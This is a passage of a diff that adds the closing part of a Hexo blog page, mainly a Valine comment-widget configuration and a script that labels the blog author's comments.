+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
 
 
                 
